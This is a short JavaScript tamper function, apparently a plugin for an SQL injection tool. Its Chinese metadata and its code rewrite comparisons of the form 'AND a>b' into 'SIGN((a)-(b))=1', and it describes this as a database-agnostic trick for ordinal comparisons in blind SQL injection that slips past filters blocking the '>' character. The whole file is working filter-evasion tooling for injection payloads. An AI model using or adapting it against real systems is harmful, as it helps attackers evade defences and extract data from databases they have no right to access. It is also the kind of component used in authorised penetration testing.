//@name: 比较转SIGN
//@usage: payload
//@enable: false
//@description: a>b→SIGN((a)-(b))=1（各库通用，盲注序数比较等价改写）
function tamper(payload){
    if (!payload) { return payload; }
    var m = /(\b(AND|OR)\b\s+)([^><]+?)\s*(?<![<>!])>(?!=)\s*(\w+|'[^']+')/i.exec(payload);
    return m ? payload.split(m[0]).join(m[1] + 'SIGN((' + m[3] + ')-(' + m[4] + '))=1') : payload;
}